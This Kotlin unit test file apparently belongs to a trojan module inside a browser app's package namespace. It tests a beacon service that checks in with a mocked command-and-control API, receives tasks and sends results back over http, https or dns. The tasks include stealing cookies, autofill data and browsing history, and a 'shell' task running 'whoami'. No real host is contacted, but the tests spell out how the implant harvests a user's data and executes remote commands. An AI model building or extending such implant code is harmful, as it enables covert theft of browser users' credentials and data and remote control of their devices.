package com.duckduckgo.trojan.impl

import com.duckduckgo.common.test.CoroutineTestRule
import com.duckduckgo.trojan.api.CheckInResult
import com.duckduckgo.trojan.api.PendingCommand
import kotlinx.coroutines.test.runTest
import org.hamcrest.CoreMatchers.`is`
import org.hamcrest.MatcherAssert.assertThat
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.mockito.kotlin.any
import org.mockito.kotlin.argumentCaptor
import org.mockito.kotlin.mock
import org.mockito.kotlin.verify
import org.mockito.kotlin.whenever
import retrofit2.Response

class RealBeaconServiceTest {

    @get:Rule
    val coroutineRule = CoroutineTestRule()

    private val mockApi: C2ApiService = mock()
    private lateinit var testee: RealBeaconService

    @Before
    fun setUp() {
        testee = RealBeaconService(mockApi)
    }

    // -----------------------------------------------------------------------
    // checkIn() tests
    // -----------------------------------------------------------------------

    @Test
    fun whenCheckInSucceedsThenReturnsTasksAsPendingCommands() = runTest {
        givenSuccessfulCheckIn()
        givenTasksResponse(
            listOf(
                TaskDto(task_id = "task-001", task_type = "request-cookies"),
            ),
        )

        val result = testee.checkIn()

        assertThat(result.commands.size, `is`(1))
        assertThat(result.commands[0].id, `is`("task-001"))
        assertThat(result.commands[0].type, `is`("request-cookies"))
        assertThat(result.beaconInterval, `is`(15))
    }

    @Test
    fun whenCheckInSucceedsThenPopulatesCommunicationProtocol() = runTest {
        givenSuccessfulCheckIn(protocol = "dns")
        givenTasksResponse(emptyList())

        val result = testee.checkIn()

        assertThat(result.communicationProtocol, `is`("dns"))
    }

    @Test
    fun whenCheckInReturnsMultipleTasksThenAllAreMapped() = runTest {
        givenSuccessfulCheckIn()
        givenTasksResponse(
            listOf(
                TaskDto(task_id = "task-001", task_type = "request-cookies"),
                TaskDto(task_id = "task-002", task_type = "shell", parameters = mapOf("cmd" to "whoami")),
                TaskDto(task_id = "task-003", task_type = "request-autofill"),
            ),
        )

        val result = testee.checkIn()

        assertThat(result.commands.size, `is`(3))
        assertThat(result.commands[0].type, `is`("request-cookies"))
        assertThat(result.commands[1].type, `is`("shell"))
        assertThat(result.commands[2].type, `is`("request-autofill"))
    }

    @Test
    fun whenNoTasksPendingThenReturnsEmptyList() = runTest {
        givenSuccessfulCheckIn()
        givenTasksResponse(emptyList())

        val result = testee.checkIn()

        assertThat(result.commands.isEmpty(), `is`(true))
    }

    @Test
    fun whenCheckInCalledThenSendsCheckInRequestFirst() = runTest {
        givenSuccessfulCheckIn()
        givenTasksResponse(emptyList())

        testee.checkIn()

        verify(mockApi).checkIn(any())
    }

    @Test
    fun whenCheckInCalledThenPollsForTasks() = runTest {
        givenSuccessfulCheckIn()
        givenTasksResponse(emptyList())

        testee.checkIn()

        verify(mockApi).getTasks(any())
    }

    @Test(expected = RuntimeException::class)
    fun whenServerUnreachableDuringCheckInThenExceptionPropagates() = runTest {
        whenever(mockApi.checkIn(any())).thenThrow(RuntimeException("Connection refused"))

        testee.checkIn()
    }

    @Test(expected = RuntimeException::class)
    fun whenServerUnreachableDuringTaskPollThenExceptionPropagates() = runTest {
        givenSuccessfulCheckIn()
        whenever(mockApi.getTasks(any())).thenThrow(RuntimeException("Connection refused"))

        testee.checkIn()
    }

    // -----------------------------------------------------------------------
    // sendResult() — HTTP protocol
    // -----------------------------------------------------------------------

    @Test
    fun whenSendResultHttpThenSubmitsToServer() = runTest {
        givenSuccessfulSendResult()

        testee.sendResult("task-001", "request-cookies", "cookies extracted", "http")

        verify(mockApi).sendResult(any())
    }

    @Test
    fun whenSendResultHttpThenEncryptedFlagIsFalse() = runTest {
        givenSuccessfulSendResult()
        val captor = argumentCaptor<TaskResultRequest>()

        testee.sendResult("task-001", "request-cookies", "data", "http")

        verify(mockApi).sendResult(captor.capture())
        assertThat(captor.firstValue.encrypted, `is`(false))
    }

    @Test
    fun whenSendResultHttpsThenEncryptedFlagIsTrue() = runTest {
        givenSuccessfulSendResult()
        val captor = argumentCaptor<TaskResultRequest>()

        testee.sendResult("task-001", "request-cookies", "data", "https")

        verify(mockApi).sendResult(captor.capture())
        assertThat(captor.firstValue.encrypted, `is`(true))
    }

    @Test
    fun whenSendResultHttpsThenOutputIsNotPlaintext() = runTest {
        givenSuccessfulSendResult()
        val captor = argumentCaptor<TaskResultRequest>()

        testee.sendResult("task-001", "request-cookies", "plain data", "https")

        verify(mockApi).sendResult(captor.capture())
        val output = captor.firstValue.data["output"] as String
        assertThat(output == "plain data", `is`(false))
    }

    @Test
    fun whenSendResultIncludesTaskType() = runTest {
        givenSuccessfulSendResult()
        val captor = argumentCaptor<TaskResultRequest>()

        testee.sendResult("task-001", "request-history", "history data", "http")

        verify(mockApi).sendResult(captor.capture())
        assertThat(captor.firstValue.task_type, `is`("request-history"))
    }

    @Test(expected = RuntimeException::class)
    fun whenSendResultHttpFailsThenExceptionPropagates() = runTest {
        whenever(mockApi.sendResult(any())).thenThrow(RuntimeException("Connection refused"))

        testee.sendResult("task-001", "request-cookies", "result data", "http")
    }

    // -----------------------------------------------------------------------
    // Helpers
    // -----------------------------------------------------------------------

    private suspend fun givenSuccessfulCheckIn(protocol: String = "http") {
        whenever(mockApi.checkIn(any())).thenReturn(
            CheckInResponse(
                status = "registered",
                beacon_interval = 15,
                communication_protocol = protocol,
            ),
        )
    }

    private suspend fun givenTasksResponse(tasks: List<TaskDto>) {
        whenever(mockApi.getTasks(any())).thenReturn(
            TasksResponse(
                device = "test-device",
                tasks = tasks,
                beacon_interval = 15,
            ),
        )
    }

    private suspend fun givenSuccessfulSendResult() {
        whenever(mockApi.sendResult(any())).thenReturn(
            Response.success(TaskResultResponse(status = "accepted", task_id = "task-001")),
        )
    }
}
